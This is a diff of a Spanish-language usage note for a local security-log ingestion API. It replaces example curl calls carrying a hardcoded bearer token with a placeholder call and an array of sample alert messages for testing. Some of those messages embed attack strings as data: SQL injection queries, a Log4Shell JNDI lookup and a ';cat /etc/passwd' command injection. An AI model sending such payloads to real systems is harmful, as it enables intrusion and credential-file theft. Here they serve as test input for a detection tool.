@@ -20,65 +20,99 @@ curl -X POST http://localhost:5000/login \
     "password": "antonio"
 }
 
-MENSAJE CRITICO
-curl -X POST http://localhost:5000/api/logs \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFudG9uaW8iLCJleHAiOjE3NTA3MDA4ODV9.d4_8KwEMG73XZd2YUzLyjq42lInbSEUJzhLl6UCd5GQ" \
-  -d '{
-    "source_ip": "192.168.1.30",
-    "timestamp": "2025-06-09T12:01:00Z",
-    "message": "Successful login as root via SSH from external IP 45.83.22.110",
-    "level": "critical",
-    "service": "ssh"
-}'
+PARA REALIZAR LLAMADAS DESDE CONSOLA:
 
 curl -X POST http://localhost:5000/api/logs \
   -H "Content-Type: application/json" \
-  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFudG9uaW8iLCJleHAiOjE3NTA3MDA4ODV9.d4_8KwEMG73XZd2YUzLyjq42lInbSEUJzhLl6UCd5GQ" \
-  -d '{
-  "source_ip": "10.0.0.5",
-  "timestamp": "2025-08-20T21:15:30Z",
-  "message": "SMBv1 exploit attempt detected. Signature matches 'ETERNALBLUE' payload on port 445.",
-  "level": "warning",
-  "service": "network_security",
-  "protocol": "SMB"
-}'
+  -H "Authorization: Bearer TOKEN" \
+  -d 'mensaje'
 
-
-
-
-MENSAJE ALTO
-curl -X POST http://localhost:5000/api/logs \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFudG9uaW8iLCJleHAiOjE3NTA3MDA4ODV9.d4_8KwEMG73XZd2YUzLyjq42lInbSEUJzhLl6UCd5GQ" \
-  -d '{
-    "source_ip": "203.0.113.45",
-    "timestamp": "2025-06-09T12:15:00Z",
-    "message": "5 failed login attempts to /admin from IP 203.0.113.45 in 1 minute",
+  ARRAY DE MENSAJES POR TIPO DE VULNERABILIDAD
+  
+[
+  {
+    "source_ip": "172.16.10.5",
+    "timestamp": "2025-09-01T15:00:10Z",
+    "message": "GET /products.php?id='UNION SELECT 1,2,3-- - HTTP/1.1",
     "level": "warning",
     "service": "webserver"
-}'
-
-MENSAJE MEDIO
-curl -X POST http://localhost:5000/api/logs \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFudG9uaW8iLCJleHAiOjE3NTA3MDA4ODV9.d4_8KwEMG73XZd2YUzLyjq42lInbSEUJzhLl6UCd5GQ" \
-  -d '{
-    "source_ip": "198.51.100.77",
-    "timestamp": "2025-06-09T12:30:00Z",
-    "message": "Port scan detected from 198.51.100.77 (ports 22, 80, 443)",
+  },
+  {
+    "source_ip": "203.0.113.88",
+    "timestamp": "2025-09-01T15:05:20Z",
+    "message": "Repeated requests (1500 per second) detected from same IP. Potential DDoS attempt.",
+    "level": "warning",
+    "service": "api_gateway"
+  },
+  {
+    "source_ip": "10.0.0.10",
+    "timestamp": "2025-09-01T15:10:30Z",
+    "message": "User 'guest' attempted to access a restricted directory '/home/admin/secrets'. Access denied.",
     "level": "info",
-    "service": "firewall"
-}'
-
-MENSAJE BAJO
-curl -X POST http://localhost:5000/api/logs \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFudG9uaW8iLCJleHAiOjE3NTA3MDA4ODV9.d4_8KwEMG73XZd2YUzLyjq42lInbSEUJzhLl6UCd5GQ" \
-  -d '{
-    "source_ip": "10.0.0.5",
-    "timestamp": "2025-06-09T12:45:00Z",
-    "message": "User jdoe logged in successfully from IP 10.0.0.5",
-    "level": "info",
+    "service": "filesystem"
+  },
+  {
+    "source_ip": "45.83.22.110",
+    "timestamp": "2025-09-01T15:15:45Z",
+    "message": "SSH login failed for user 'root'. Attempt 567 in 5 minutes from '45.83.22.110'.",
+    "level": "warning",
     "service": "ssh"
-}'
+  },
+  {
+    "source_ip": "54.239.25.1",
+    "timestamp": "2025-09-01T15:20:50Z",
+    "message": "Request to '/wp-admin/includes/class-wp-texturize.php' with unusual parameters.",
+    "level": "info",
+    "service": "webserver"
+  },
+  {
+    "source_ip": "192.168.1.50",
+    "timestamp": "2025-09-01T15:25:00Z",
+    "message": "Blocked connection from known malicious IP. Rule 'DShield-blocklist' triggered.",
+    "level": "critical",
+    "service": "firewall"
+  },
+  {
+    "source_ip": "203.0.113.15",
+    "timestamp": "2025-09-01T15:30:15Z",
+    "message": "POST /api/data?query=SELECT table_name FROM information_schema.tables WHERE table_schema = database() HTTP/1.1",
+    "level": "warning",
+    "service": "database"
+  },
+  {
+    "source_ip": "172.16.20.1",
+    "timestamp": "2025-09-01T15:35:30Z",
+    "message": "SSL certificate for 'api.prod.corp' will expire in 10 days.",
+    "level": "info",
+    "service": "certificate_monitor"
+  },
+  {
+    "source_ip": "192.168.1.30",
+    "timestamp": "2025-09-01T15:40:45Z",
+    "message": "User-Agent: Mozilla/5.0 (${jndi:ldap://192.168.1.10:1389/a})",
+    "level": "critical",
+    "service": "webserver"
+  },
+  {
+    "source_ip": "203.0.113.99",
+    "timestamp": "2025-09-01T15:45:00Z",
+    "message": "Attempted file upload of 'malicious.php' to '/uploads/user_files'. File type blocked.",
+    "level": "warning",
+    "service": "file_upload"
+  },
+  {
+    "source_ip": "10.0.0.22",
+    "timestamp": "2025-09-01T15:50:15Z",
+    "message": "GET /download.php?file=;cat /etc/passwd HTTP/1.1",
+    "level": "critical",
+    "service": "webserver"
+  },
+  {
+    "source_ip": "198.51.100.1",
+    "timestamp": "2025-09-01T15:55:30Z",
+    "message": "Unusual number of 401 Unauthorized responses from a single IP. Potential password spraying.",
+    "level": "warning",
+    "service": "api_gateway"
+  }
+]
+
